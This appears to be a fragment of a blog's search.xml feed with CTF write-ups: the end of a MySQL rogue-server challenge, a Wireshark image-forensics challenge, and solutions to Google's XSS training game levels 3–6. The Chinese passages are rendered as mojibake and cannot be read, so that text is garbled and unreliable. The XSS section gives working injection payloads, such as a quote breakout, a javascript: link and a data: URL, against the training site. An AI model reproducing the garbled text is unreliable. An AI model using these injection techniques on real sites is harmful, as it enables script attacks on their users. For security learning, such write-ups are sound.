<p>åŒæ—¶è¿è¡Œç»è¿‡ä¿®æ”¹åçš„<code>agent.py</code>å’Œæˆ‘ä»¬çš„è„šæœ¬ï¼ŒåŒæ—¶åœ¨é¢˜ç›®ä¸­å¡«ä¸Šæˆ‘ä»¬çš„ipå’Œmysqlçš„ç«¯å£å·ï¼Œå°±å¾—åˆ°äº†flag</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57570617-9944f500-7436-11e9-93c5-11b65904cd31.png" alt="Screenshot from 2019-05-11 16-30-14"></p>
<p>å‚è€ƒ ï¼š<br>
<a href="https://xz.aliyun.com/t/3277" target="_blank" rel="noopener">https://xz.aliyun.com/t/3277</a></p>
<p><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a></p>
<p><a href="https://www.anquanke.com/post/id/106488" target="_blank" rel="noopener">https://www.anquanke.com/post/id/106488</a></p>
<h2 id="wireshark">wireshark</h2>
<p>æ‹¿åˆ°æ•°æ®åŒ…ï¼Œæ‰“å¼€ï¼Œè®¾ç½®è¿‡æ»¤æ¡ä»¶<code>http</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰å›¾ç‰‡æµé‡ã€‚ä½¿ç”¨<code>file-&gt;export objects-&gt;http</code>æ¥å¯¼å‡ºæ‰€æœ‰å¯ä»¥å¯¼å‡ºçš„ä¸œè¥¿ï¼Œç„¶åæœ‰ä¸¤ä¸ªé€šè¿‡16è¿›åˆ¶ç¼–è¾‘å™¨ä¿®æ”¹å¾—å‡ºçš„å›¾ç‰‡å’Œä¸€å¼ å®Œæ•´å›¾ç‰‡ã€‚å…¶ä¸­ï¼Œä¸¤å¼ å›¾ç‰‡ä¸­æœ‰ä¸€å¼ æ— æ³•æŸ¥çœ‹ï¼Œå¦ä¸€å¼ å’Œå®Œæ•´çš„é‚£å¼ å›¾ç‰‡ä¸€æ¨¡ä¸€æ ·ã€‚æˆ–è€…ä¹Ÿå¯ä»¥å³å‡»å¯¼å‡ºå›¾ä¸­æŒ‡å®šçš„å›¾ç‰‡éƒ¨åˆ†æ•°æ®ã€‚</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57571087-2474b980-743c-11e9-976a-480a59136d09.png" alt="Screenshot from 2019-05-11 22-18-49"></p>
<p>åœ¨<code>wireshark</code>ä¸­è¿½è¸ªTCPæµï¼Œå‘ç°æœ€å¼€å§‹è®¿é—®äº†ä¸€ä¸ªå›¾ç‰‡åŠ å¯†çš„ç½‘ç«™ã€‚</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57571086-23dc2300-743c-11e9-90fc-a068dc33cbfa.png" alt="Screenshot from 2019-05-11 22-22-25"></p>
<p>è¿›å…¥ï¼Œçœ‹èµ·æ¥å›¾ç‰‡çš„è§£å¯†æ˜¯éœ€è¦å¯†é’¥çš„ï¼Œé‚£ä¹ˆå¦ä¸€å¼ æ— æ³•æŸ¥çœ‹çš„å›¾ç‰‡å¯èƒ½æœ‰æˆ‘ä»¬æƒ³è¦çš„å¯†é’¥ã€‚ä¿®æ”¹é«˜å®½ä¹‹åå¯ä»¥æŸ¥çœ‹å¯†é’¥ã€‚è¿›å…¥è§£å¯†ç½‘ç«™è§£å¯†ï¼Œå¹¶ç”¨16è¿›åˆ¶è§£å¯†å³å¯ã€‚</p>
<img width="799" alt="upload_repaire" src="https://user-images.githubusercontent.com/40637063/57571120-73225380-743c-11e9-8178-e1f74c83a67a.png">
<p><img src="https://user-images.githubusercontent.com/40637063/57571078-f1322a80-743b-11e9-8ebe-099e2db550f7.png" alt="Screenshot from 2019-05-11 15-24-45"></p>
]]></content>
  </entry>
  <entry>
    <title>Google_Game</title>
    <url>/2019/06/12/Google-Game/</url>
    <content><![CDATA[<h1>Google Xss game</h1>
<h3 id="Level-3">Level 3</h3>
<p><img src="https://user-images.githubusercontent.com/40637063/58802751-83df7700-8640-11e9-8bfc-886723f4ed66.png" alt="image"></p>
<p>This website provides some API (after the arch pointer).</p>
<p>solution:</p>
<figure class="highlight plain"><figcaption><span>src</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### level 4</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58806619-2b60a780-8649-11e9-8fa4-2f75a62e5e1b.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span><br><span class="line">    &lt;script src=&quot;/static/game-frame.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/game-frame-styles.css&quot; /&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function startTimer(seconds) &#123;</span><br><span class="line">        seconds = parseInt(seconds) || 3;</span><br><span class="line">        setTimeout(function() &#123; </span><br><span class="line">          window.confirm(&quot;Time is up!&quot;);</span><br><span class="line">          window.history.back();</span><br><span class="line">        &#125;, seconds * 1000);</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body id=&quot;level4&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;/static/logos/level4.png&quot; /&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&apos;&#123;&#123; timer &#125;&#125;&apos;);&quot; /&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;div id=&quot;message&quot;&gt;Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>solution:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xss-game.appspot.com/level4/frame?timer=&apos;);alert(&apos;</span><br></pre></td></tr></table></figure>
<h3 id="level-5">level 5</h3>
<p><img src="https://user-images.githubusercontent.com/40637063/58806063-edaf4f00-8647-11e9-91f6-ef3ce12e1a69.png" alt="image"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--signup.html--&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/static/game-frame.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/static/game-frame-styles.css"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"level5"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/logos/level5.png"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- We're ignoring the email, but the poor user will never know! --&gt;</span></span><br><span class="line">    Enter email: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"reader-email"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; next &#125;&#125;"</span>&gt;</span>Next &gt;&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>solution:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(&apos;xss&apos;)</span><br></pre></td></tr></table></figure>
<p>and click the <code>Next</code> button.</p>
<h3 id="level-6">level 6</h3>
<p><img src="https://user-images.githubusercontent.com/40637063/58806432-c1480280-8648-11e9-8d7f-eb763e2a0757.png" alt="image"></p>
<p>This website allow user to execute alternative js script</p>
<p>solution:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xss-game.appspot.com/level6/frame#data:text/plain,alert(&apos;xss&apos;)</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
</search>
